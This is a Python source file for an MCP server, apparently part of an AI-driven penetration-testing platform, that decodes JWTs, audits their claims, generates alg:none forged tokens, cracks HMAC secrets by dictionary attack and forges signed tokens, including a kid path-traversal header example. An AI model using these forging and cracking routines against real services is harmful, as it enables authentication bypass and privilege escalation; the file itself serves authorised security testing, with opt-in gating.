#!/usr/bin/env python3
"""
SOCIS-AI-PT — JWT MCP Server (HTTP transport)
JWT decode, analysis, and attack testing

Provides:
1. decode_jwt       - Decode and inspect a JWT token
2. test_alg_none    - Test for alg:none vulnerability
3. test_weak_secret - Test for weak HMAC secret via dictionary attack
4. forge_jwt        - Forge a JWT with modified claims (for authorised testing)
5. analyze_claims   - Analyze JWT claims for security issues
"""

import json
import asyncio
import logging
import base64
import hmac
import hashlib
import re
import uvicorn
from datetime import datetime, timezone
from typing import Any
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from mcp_auth import verify_mcp_auth, mcp_auth_error

try:
    import jwt as pyjwt
    _HAS_PYJWT = True
except ImportError:
    _HAS_PYJWT = False

# ───────────────────────────────────────────────────────────
# CONFIGURATION
# ───────────────────────────────────────────────────────────

TOOL_NAME = "jwt"
MCP_PORT = 8120
MCP_VERSION = "1.0"
SERVER_NAME = f"{TOOL_NAME}-mcp"

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

import os

# ── Wordlist resolution (shared pattern with ffuf/wpscan/gobuster servers) ─────
WORDLIST_DIR = os.environ.get("WORDLIST_DIR", "/usr/share/wordlists")

def _get_wordlist_lines(name: str) -> list[str]:
    """Load a built-in wordlist by name and return its lines.

    Only bare filenames are accepted (no slashes, no leading dots) to prevent
    path-traversal attacks.  Falls back to an empty list on any error so the
    server still tries the built-in _COMMON_SECRETS list.
    """
    if not name or isinstance(name, list):
        # Callers may pass a pre-built list — handle gracefully
        return list(name) if isinstance(name, list) else []
    name = str(name).strip()
    if "/" in name or ".." in name or name.startswith("."):
        log.warning(f"[jwt] Rejected unsafe wordlist name: {name!r}")
        return []
    filename = name if name.endswith(".txt") else f"{name}.txt"
    full_path = os.path.join(WORDLIST_DIR, filename)
    try:
        with open(full_path, encoding="utf-8", errors="replace") as f:
            return [line.rstrip("\n") for line in f if line.strip()]
    except OSError as e:
        log.warning(f"[jwt] Could not load wordlist {filename!r}: {e}")
        return []

# ───────────────────────────────────────────────────────────
# TOOL DEFINITIONS
# ───────────────────────────────────────────────────────────

TOOLS = [
    {
        "name": "decode_jwt",
        "description": "Decode a JWT token without verifying the signature — shows header, payload claims, and basic metadata.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "The JWT token string (three base64url-encoded parts separated by dots)"
                }
            },
            "required": ["token"]
        }
    },
    {
        "name": "test_alg_none",
        "description": "Test if the server accepts a JWT with algorithm set to 'none' — a critical vulnerability that allows forging tokens without a secret.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "A valid JWT token to base the attack on"
                },
                "modified_claims": {
                    "type": "object",
                    "description": "Claims to modify in the forged token (e.g. {\"role\": \"admin\", \"sub\": \"0\"})",
                    "default": {}
                }
            },
            "required": ["token"]
        }
    },
    {
        "name": "test_weak_secret",
        "description": "Dictionary attack against a JWT's HMAC signature to find a weak signing secret.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "The JWT token to crack"
                },
                "wordlist": {
                    "type": "string",
                    "description": "Built-in wordlist name: passwords (default), common, big. The server will also always try a set of well-known common secrets. Leave blank to use built-ins only.",
                    "default": "passwords"
                }
            },
            "required": ["token"]
        }
    },
    {
        "name": "forge_jwt",
        "description": "Forge a JWT with a known secret and custom claims — for authorised security testing.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "secret": {
                    "type": "string",
                    "description": "The signing secret/key"
                },
                "algorithm": {
                    "type": "string",
                    "description": "Signing algorithm",
                    "default": "HS256",
                    "enum": ["HS256", "HS384", "HS512", "none"]
                },
                "claims": {
                    "type": "object",
                    "description": "JWT payload claims (e.g. {\"sub\": \"admin\", \"role\": \"admin\"})",
                    "default": {}
                },
                "header_extra": {
                    "type": "object",
                    "description": "Extra header fields to add (e.g. {\"kid\": \"../../../dev/null\"})",
                    "default": {}
                }
            },
            "required": ["secret"]
        }
    },
    {
        "name": "analyze_claims",
        "description": "Analyze JWT claims for security issues — expiry, audience, issuer validation, sensitive data exposure, privilege indicators.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "The JWT token to analyze"
                }
            },
            "required": ["token"]
        }
    },
]

# FastAPI app
app = FastAPI(title=f"SOCIS {TOOL_NAME} MCP Server", docs_url=None)

# ───────────────────────────────────────────────────────────
# MCP PROTOCOL HANDLERS
# ───────────────────────────────────────────────────────────

@app.get("/health")
async def health_check():
    return {"status": "healthy", "server": SERVER_NAME, "version": MCP_VERSION}


@app.post("/mcp")
async def handle_mcp_request(request: Request):
    if not verify_mcp_auth(request):
        return mcp_auth_error()
    try:
        data = await request.json()
        req_id = data.get("id")
        method = data.get("method")

        log.info(f"[MCP] Received request: {method}")

        if method == "tools/list":
            return JSONResponse({"jsonrpc": "2.0", "id": req_id, "result": {"tools": TOOLS}})

        elif method == "tools/call":
            tool_name = data.get("params", {}).get("name")
            arguments = data.get("params", {}).get("arguments", {})

            log.info(f"[MCP] Executing tool: {tool_name}")

            if not any(t["name"] == tool_name for t in TOOLS):
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": f"Unknown tool: {tool_name}"}},
                    status_code=400
                )

            try:
                if tool_name == "decode_jwt":
                    result = handle_decode_jwt(arguments)
                elif tool_name == "test_alg_none":
                    result = handle_test_alg_none(arguments)
                elif tool_name == "test_weak_secret":
                    result = handle_test_weak_secret(arguments)
                elif tool_name == "forge_jwt":
                    result = handle_forge_jwt(arguments)
                elif tool_name == "analyze_claims":
                    result = handle_analyze_claims(arguments)
                else:
                    raise ValueError(f"No handler for tool: {tool_name}")

                return JSONResponse({
                    "jsonrpc": "2.0", "id": req_id,
                    "result": {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
                })

            except ValueError as e:
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": str(e)}},
                    status_code=400
                )
            except Exception as e:
                log.error(f"[MCP] Tool error: {e}")
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32603, "message": str(e)}},
                    status_code=500
                )

        else:
            return JSONResponse(
                {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32601, "message": f"Method not found: {method}"}},
                status_code=404
            )

    except json.JSONDecodeError:
        return JSONResponse({"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": "Parse error"}}, status_code=400)
    except Exception as e:
        log.error(f"[MCP] Unexpected error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ───────────────────────────────────────────────────────────
# JWT UTILITIES
# ───────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Decode base64url string with padding fix."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _split_token(token: str) -> tuple[str, str, str]:
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format — expected 3 dot-separated parts, got {len(parts)}")
    return parts[0], parts[1], parts[2]


def _decode_part(b64: str) -> dict:
    try:
        return json.loads(_b64url_decode(b64))
    except Exception as e:
        raise ValueError(f"Failed to decode JWT part: {e}")


def _hmac_sign(msg: bytes, secret: bytes, alg: str) -> bytes:
    if alg == "HS256":
        return hmac.new(secret, msg, hashlib.sha256).digest()
    elif alg == "HS384":
        return hmac.new(secret, msg, hashlib.sha384).digest()
    elif alg == "HS512":
        return hmac.new(secret, msg, hashlib.sha512).digest()
    raise ValueError(f"Unsupported algorithm for HMAC: {alg}")


def _build_token(header: dict, payload: dict, secret: str, alg: str) -> str:
    """Build a signed JWT from parts."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    if alg == "none":
        return f"{h}.{p}."
    sig = _hmac_sign(msg, secret.encode(), alg)
    return f"{h}.{p}.{_b64url_encode(sig)}"


# Common weak JWT secrets for dictionary attack
_COMMON_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "letmein",
    "jwt_secret", "your-256-bit-secret", "change_me", "supersecret",
    "mysecret", "jwttoken", "secretkey", "private", "key", "token",
    "jwt", "HS256", "HS384", "HS512", "test", "development", "dev",
    "prod", "production", "staging", "secret123", "password123",
    "abc123", "security", "access", "api_key", "apikey", "app_secret",
    "", "null", "undefined", "none", "changeme", "replace_me",
]

# ───────────────────────────────────────────────────────────
# TOOL IMPLEMENTATIONS
# ───────────────────────────────────────────────────────────

def handle_decode_jwt(args: dict) -> dict:
    token = args.get("token", "").strip()
    if not token:
        raise ValueError("'token' parameter is required")

    h_b64, p_b64, sig_b64 = _split_token(token)
    header = _decode_part(h_b64)
    payload = _decode_part(p_b64)

    # Decode timestamps
    now_ts = int(datetime.now(timezone.utc).timestamp())
    exp = payload.get("exp")
    iat = payload.get("iat")
    nbf = payload.get("nbf")

    time_info: dict[str, Any] = {}
    if exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).isoformat()
        time_info["expires_at"] = exp_dt
        time_info["expired"] = now_ts > exp
        time_info["seconds_until_expiry"] = exp - now_ts
    if iat:
        time_info["issued_at"] = datetime.fromtimestamp(iat, tz=timezone.utc).isoformat()
    if nbf:
        time_info["not_before"] = datetime.fromtimestamp(nbf, tz=timezone.utc).isoformat()
        time_info["active"] = now_ts >= nbf

    return {
        "tool": "decode_jwt",
        "header": header,
        "payload": payload,
        "signature": sig_b64,
        "signature_present": bool(sig_b64),
        "algorithm": header.get("alg", "unknown"),
        "token_type": header.get("typ", "unknown"),
        "time_info": time_info,
        "success": True,
    }


def handle_test_alg_none(args: dict) -> dict:
    token = args.get("token", "").strip()
    if not token:
        raise ValueError("'token' parameter is required")
    modified_claims: dict = args.get("modified_claims", {}) or {}

    h_b64, p_b64, _ = _split_token(token)
    header = _decode_part(h_b64)
    payload = _decode_part(p_b64)

    original_alg = header.get("alg", "unknown")

    # Apply claim modifications
    forged_payload = {**payload, **modified_claims}

    # Variant 1: alg = "none"
    hdr_none = {**header, "alg": "none"}
    token_none = _build_token(hdr_none, forged_payload, "", "none")

    # Variant 2: alg = "None" (capitalised)
    hdr_none_cap = {**header, "alg": "None"}
    h2 = _b64url_encode(json.dumps(hdr_none_cap, separators=(",", ":")).encode())
    p2 = _b64url_encode(json.dumps(forged_payload, separators=(",", ":")).encode())
    token_none_cap = f"{h2}.{p2}."

    # Variant 3: alg = "NONE"
    hdr_none_up = {**header, "alg": "NONE"}
    h3 = _b64url_encode(json.dumps(hdr_none_up, separators=(",", ":")).encode())
    token_none_up = f"{h3}.{p2}."

    return {
        "tool": "test_alg_none",
        "original_algorithm": original_alg,
        "original_claims": payload,
        "modified_claims": modified_claims,
        "forged_payload": forged_payload,
        "tokens": {
            "alg_none": token_none,
            "alg_None": token_none_cap,
            "alg_NONE": token_none_up,
        },
        "instructions": (
            "Replace the Authorization: Bearer <token> header with each forged token variant above. "
            "If the server accepts any of them, it is vulnerable to the alg:none attack (CVE category: JWT security bypass)."
        ),
        "success": True,
    }


def handle_test_weak_secret(args: dict) -> dict:
    token = args.get("token", "").strip()
    if not token:
        raise ValueError("'token' parameter is required")
    extra_words: list[str] = _get_wordlist_lines(args.get("wordlist", "passwords"))

    h_b64, p_b64, sig_b64 = _split_token(token)
    header = _decode_part(h_b64)
    alg = header.get("alg", "HS256")

    if not alg.startswith("HS"):
        return {
            "tool": "test_weak_secret",
            "algorithm": alg,
            "cracked": False,
            "message": f"Algorithm '{alg}' is not HMAC-based — dictionary attack not applicable.",
            "success": True,
        }

    msg = f"{h_b64}.{p_b64}".encode()
    try:
        expected_sig = _b64url_decode(sig_b64)
    except Exception:
        raise ValueError("Failed to decode JWT signature")

    wordlist = list(dict.fromkeys(extra_words + _COMMON_SECRETS))  # deduplicate, extras first

    found_secret = None
    for candidate in wordlist:
        try:
            sig_bytes = _hmac_sign(msg, candidate.encode(), alg)
            if hmac.compare_digest(sig_bytes, expected_sig):
                found_secret = candidate
                break
        except Exception:
            continue

    result: dict[str, Any] = {
        "tool": "test_weak_secret",
        "algorithm": alg,
        "candidates_tested": len(wordlist),
        "cracked": found_secret is not None,
        "success": True,
    }
    if found_secret is not None:
        result["secret"] = found_secret
        result["message"] = f"VULNERABLE — signing secret found: '{found_secret}'"
    else:
        result["message"] = "Secret not found in wordlist. Try a larger wordlist."

    return result


def handle_forge_jwt(args: dict) -> dict:
    # Defense-in-depth: the backend's generic manifest dispatcher is the primary gate for every exploitation-class
    # tool (checked before this server is ever called) — this server itself never verified the opt-in independently.
    from mcp_auth import offensive_action_allowed
    if not offensive_action_allowed():
        raise ValueError("Forging a JWT is an exploitation-class action and requires SOCIS_AGENT_ALLOW_OFFENSIVE to "
                          "be enabled on the server (defense-in-depth check — the backend's own gate should already "
                          "have blocked this; seeing this error means this server was called directly).")
    secret = args.get("secret", "")
    alg = args.get("algorithm", "HS256")
    claims: dict = args.get("claims", {}) or {}
    header_extra: dict = args.get("header_extra", {}) or {}

    allowed_algs = {"HS256", "HS384", "HS512", "none"}
    if alg not in allowed_algs:
        raise ValueError(f"Unsupported algorithm '{alg}'. Allowed: {sorted(allowed_algs)}")

    if alg != "none" and not secret:
        raise ValueError("'secret' is required for HMAC algorithms")

    header: dict = {"alg": alg, "typ": "JWT"}
    header.update(header_extra)

    token = _build_token(header, claims, secret, alg)

    return {
        "tool": "forge_jwt",
        "algorithm": alg,
        "header": header,
        "claims": claims,
        "token": token,
        "success": True,
    }


def handle_analyze_claims(args: dict) -> dict:
    token = args.get("token", "").strip()
    if not token:
        raise ValueError("'token' parameter is required")

    h_b64, p_b64, sig_b64 = _split_token(token)
    header = _decode_part(h_b64)
    payload = _decode_part(p_b64)

    now_ts = int(datetime.now(timezone.utc).timestamp())
    issues: list[str] = []
    warnings: list[str] = []
    info: list[str] = []

    alg = header.get("alg", "")
    if alg.lower() in ("none", ""):
        issues.append("CRITICAL: Algorithm is 'none' — no signature verification.")
    elif alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"):
        info.append(f"Uses asymmetric algorithm: {alg}")
    elif alg.startswith("HS"):
        warnings.append(f"Uses symmetric HMAC ({alg}) — ensure secret is strong and rotated.")

    if not sig_b64:
        issues.append("CRITICAL: Token has no signature (empty signature part).")

    # Expiry checks
    exp = payload.get("exp")
    if not exp:
        issues.append("CRITICAL: No 'exp' (expiry) claim — token never expires.")
    elif now_ts > exp:
        issues.append(f"CRITICAL: Token expired at {datetime.fromtimestamp(exp, tz=timezone.utc).isoformat()}")
    else:
        remaining = exp - now_ts
        if remaining > 86400 * 30:
            warnings.append(f"Token valid for {remaining // 86400} days — unusually long lifetime.")

    if not payload.get("aud"):
        warnings.append("No 'aud' (audience) claim — server may not validate intended recipient.")
    if not payload.get("iss"):
        warnings.append("No 'iss' (issuer) claim — cannot verify token origin.")
    if not payload.get("sub"):
        warnings.append("No 'sub' (subject) claim — identity not explicitly bound.")
    if not payload.get("jti"):
        warnings.append("No 'jti' (JWT ID) — replay attacks may be possible if server doesn't track tokens.")
    if not payload.get("iat"):
        warnings.append("No 'iat' (issued at) claim.")
    if not payload.get("nbf"):
        info.append("No 'nbf' (not before) claim — token usable immediately after issuance.")

    # Sensitive data check
    sensitive_keys = ["password", "passwd", "secret", "token", "key", "credit_card", "ssn", "pin"]
    for k in payload:
        if any(s in k.lower() for s in sensitive_keys):
            issues.append(f"SENSITIVE DATA: Claim '{k}' may contain sensitive information (JWT payload is not encrypted).")

    # Privilege indicators
    priv_keys = ["role", "roles", "permissions", "scope", "admin", "is_admin", "privilege", "groups"]
    found_priv = {k: payload[k] for k in payload if any(p in k.lower() for p in priv_keys)}
    if found_priv:
        warnings.append(f"Privilege claims found: {found_priv} — check if server enforces these.")

    risk = "low"
    if issues:
        risk = "critical" if any("CRITICAL" in i for i in issues) else "high"
    elif warnings:
        risk = "medium"

    return {
        "tool": "analyze_claims",
        "header": header,
        "payload": payload,
        "risk_level": risk,
        "issues": issues,
        "warnings": warnings,
        "info": info,
        "privilege_claims": found_priv,
        "success": True,
    }


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=MCP_PORT, log_level="info")
